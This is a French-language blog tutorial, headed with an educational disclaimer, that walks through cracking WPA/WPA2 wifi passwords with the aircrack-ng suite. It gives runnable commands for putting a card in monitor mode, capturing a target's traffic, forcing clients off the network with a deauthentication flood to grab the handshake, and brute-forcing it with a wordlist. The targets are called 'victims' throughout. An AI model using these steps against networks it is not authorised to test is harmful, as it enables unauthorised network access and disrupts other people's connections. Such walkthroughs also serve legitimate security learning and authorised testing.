---
layout: post
title:  "How to use aircrack-ng to bruteforce wifi WPA password"
---

# Comment bruteforce un réseau wifi WPA/WPA2 avec aircrack-ng

# Disclaimer

Ceci est dans un but purement éducatif, rentrer dans un système informatique sans l'autorisation de son propriétaire est interdit par la loi française. 

Bon tutoriel.

# Matériel 

Pour ce tutoriel il faut:

- Être sous une distribution Linux
- Avoir une carte réseau wifi
- Une [Wordlist](https://weakpass.com/wordlist) (liste de mots contenants des mots de passe)

# Installation

Vous pouvez trouver comment installer aircrack-ng directement sur le dépot officiel de aircrack-ng : -> [ici](https://github.com/aircrack-ng/aircrack-ng)​

En fonction de votre distro:

- basée sur Debian (Ubuntu/Mint): `sudo apt-get install aircrack-ng`
- Fedora:  `sudo dnf install aircrack-ng`
- Arch Lnux: `sudo pacman -S aircrack-ng`

Une fois installé vous pouvez retrouver la suite d'outils aircrack-ng sur votre ordinateur.

(pour cet exemple j'ai écrit le mot "air" et utilisé l'autocomplétion pour voir tous les outils de la suite)

```
root@yourid:~$ air
airbase-ng              aireplay-ng             airolib-ng
aircrack-ng/            airmon-ng               airserv-ng
airdecap-ng             airodump-ng             airtun-ng
airdecloak-ng           airodump-ng-oui-update  airventriloquist-ng

```
# Managed to Monitor

Par default votre carte wifi est en mode **Managed**, ce qui vous permet de recevoir la connexion internet.

Nous allons passer la carte wifi en mode **Monitor**, qui permet d'observer et d'envoyer des signaux.

Pour ceci il faut tout d'abord identifier le nom de sa carte wifi, en utilisant la commande `iwconfig`:

```
root@yourid:~$ iwconfig
wlp00s0   IEEE 802.11  ESSID:"Wifi-ESSID"  
          Mode:Managed  Frequency:5.18 GHz  Access Point: XX:XX:XX:XX:XX:XX   
          Bit Rate=666.0 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=70/70  Signal level=-40 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:37  Invalid misc:2628   Missed beacon:0

```
Le nom de la carte wifi est donc : `wlp00s0`

Nous allons utiliser l'outil `airmon-ng` qui permet justement de changer la carte wifi en mode monitor

```
root@yourid:~$ airmon-ng start [nom de la carte wifi]
```

**pro tip**: il est possible que cette commande fonctionne pas, il y a plusieures possibilitées:
 - Le message `Run it as root`: il faut avoir les droits super utilisateur (root).
 - Un message d'aide s'affiche: vous n'avez surment pas mis le bon nom de la carte wifi
 - Un message d'erreur s'affiche: il se peut que des processus peuvent perturber l'opération, dans ce cas il faut faire la commande `airmong-ng check kill`
 - Cela ne marche pas, il est possible que votre carte wifi n'est pas compatible avec le mode monitor

Une fois cette étape terminée, vous n'avez plus de connexion internet, **c'est normal**.

Nous allons vérifier si la carte wifi a bien été mise en mode monitor:

```
root@yourid:~$ iwconfig
wlp00s0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=0 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

On peut voir que le nom de la carte wifi a changé pour rajouter 'mon' derniere son nom.

# Scanner et trouver une victime

Nous allons scanner les réseaux wifi aux alentours et utiliser l'outil `airodump-ng`, un outil de capture de paquets wifi.

```
root@yourid:~$ airodump-ng [nom de la carte wifi]
```
**attention de pas oublier le `mon` derriere le nom de votre catre wifi** :)

![airodump](../../../assets/airodump.png)

Sur cette image le nom de mon réseau wifi est **IEWYUAH**.

Plusieures informations sont affichées, telles que:
- **BSSID** (Basic Service Set Identifiers) : Addresse MAC du routeur.
- **PWR** (Power) : Puissance du signal
- **#Data** : Données transmises
- **#/s** (S pour speed): Rapidité d'envoi des données
- **CH** (pour channel): Canal wifi
- **ENC** (pour encryption): Infos sur le protocole de chiffrement
- **AUTH** : Infos sur le type d'authentification
- **ESSID** (Electronic Service Set Identifiers) : Nom du réseau wifi

```
root@yourid:~$ airodump-ng –c[id channel de votre victime] -w [nom du fichier de capture (qui va être crée)] -d [BSSID de votre victime] [nom de votre carte wifi]
```
**pro tip**: Il est possible qu'un message d'erreur s'affiche, c'est surment dû au canal de votre carte wifi. 
On peut voir sur l'image en dessous en haut a gauche, au dessus du BSSID il y a écrit `CH 1`: votre carte wifi change de canal. 
**Il ne faut pas hésiter a relancer la commande plusieurs fois avant que celle ci marche !**

![airodump-cpt](../../../assets/airodump-cpt.png)

`STATION` correspond à l'adresse MAC de la personne connectée

**Attention**: A partir de ce moment, vous êtes en train d'enregister des captures réseaux sur votre ordinateur, il ne faut donc pas fermer votre terminal sous peine de stopper la capture réseaux.


# Get the handshake

Pour pouvoir réussir a intercepter le mot de passe wifi de votre victime, il faut capturer le *handshake*. 
Le handshake (poignée de main en français) est l'échange de validation entre le client et le routeur.

Nous allons utiliser `airplay-ng` pour injecter des paquets à une ou plusieurs machines sur le réseau pour les forcer à se déconnecter (Attaque par déni de service).

```
root@yourid:~$ aireplay-ng --deauth 0 –a [BSSID de votre victime] -c [Adress MAC d'un apareil connecté au réseaux de la victime] [nom de votre carte wifi]​
```

Quand la machine victime va se reconnecter aux réseau automatiquement vous allez récuperer le handshake.
Une fois l'attaque lancée vous pouvez la stopper quand vous le désirez.

# Le bruteforce !

Une fois le handshake capturé, vous pouvez remettre votre carte wifi en mode managed.

```
root@yourid:~$ airmon-ng stop [nom de votre carte wifi]
```

Si vous refaites la commande `iwconfig`, vous allez remarquer que votre carte wifi a repri son nom initial.

Pour la dernière étape nous allons essayer de comparer le hash du handshake au hash d'une liste de mots de passe, si cette opération réussie nous avons le mot de passe du wifi victime.

```
root@yourid:~$ aircrack-ng [nom du paquet réseaux capture (files.cap)] -w [wordlist]
```

Si le mot de passe est présent dans la wordlist:

Dans mon cas, j'ai testé en rajoutant le mot de passe a la fin d'une wordlist de 7000 mots de passe, cela m'a prit moins de 5 secondes pour le trouver.

![aircrack-get-passwd](../../../assets/aircrack-get-psswd.png)

Dans le cas contraire:

![aircrack-fail](../../../assets/aircrack-fail.png)

# Conclusion 

Voici une méthode pour cracker les mots de passe wifi, en informatique rien n'est magique.


# Remerciements

Merci beaucoup d'avoir lu mon tutoriel, j'éspere que ça vous à plu!

Si vous avez des retours, n'hésitez pas à m'envoyer un mail :smiley:

